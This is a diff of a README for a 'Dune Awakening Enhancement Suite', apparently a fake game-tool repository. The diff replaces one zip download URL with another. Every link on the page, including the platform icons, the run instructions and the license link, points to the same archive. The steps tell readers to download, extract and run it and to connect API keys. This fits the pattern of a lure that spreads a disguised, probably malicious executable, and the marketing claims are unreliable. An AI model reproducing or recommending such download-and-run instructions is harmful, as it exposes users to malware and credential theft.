@@ -1,6 +1,6 @@
 # Dune Awakening Enhancement Suite
 
-[![Download](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip%20Now-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip)
+[![Download](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip%20Now-blue?logo=github&style=for-the-badge)](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip)
 
 Unlock your true potential in the vast deserts of Arrakis with **Dune Awakening Enhancement Suite** — a curated collection of advanced utilities and productivity tools designed to amplify your gameplay experience.
 
@@ -14,9 +14,9 @@ Explore the boundless dunes no matter your device. Here’s where our Enhancemen
 
 | Platform        | Compatibility |  
 |-----------------|:-------------:|  
-| ![Windows](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip) | ✅ |  
-| ![macOS](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip)       | ✅ |  
-| ![Linux](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip)       | ✅ |  
+| ![Windows](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip) | ✅ |  
+| ![macOS](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip)       | ✅ |  
+| ![Linux](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip)       | ✅ |  
 
 ---
 
@@ -72,9 +72,9 @@ Whether it’s dawn or dusk in your city, our global team is ready. Submit a tic
 
 To begin your journey on Arrakis with the Dune Awakening Enhancement Suite:
 
-1. Download the latest version by clicking: https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip
+1. Download the latest version by clicking: https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip
 2. Extract the package using your favorite archiving tool.
-3. Run the `https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip` (Windows), `https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip` (macOS), or `https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip` (Linux).
+3. Run the `https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip` (Windows), `https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip` (macOS), or `https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip` (Linux).
 4. Launch the Enhancement Suite from your desktop or application drawer.
 5. Customize settings & connect your API keys (optional for AI integrations).
 
@@ -92,12 +92,12 @@ All productivity and overlay functions are provided “as-is.” Use at your own
 
 ## 📜 MIT License
 
-Distributed under the MIT License. Please review the full license text [here](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip).
+Distributed under the MIT License. Please review the full license text [here](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip).
 
 © 2025 Dune Awakening Enhancement Suite. All rights reserved.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip%20Now-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/Chrislovlin/dune-awakening-toolkit/branch/teethlike/dune-awakening-toolkit_1.3.zip)
+[![Download](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip%20Now-blue?logo=github&style=for-the-badge)](https://github.com/Chrislovlin/dune-awakening-toolkit/raw/refs/heads/branch/teethlike/dune-awakening-toolkit-v3.8.zip)
 
 Embark on an evolved path across Arrakis. The dunes await.
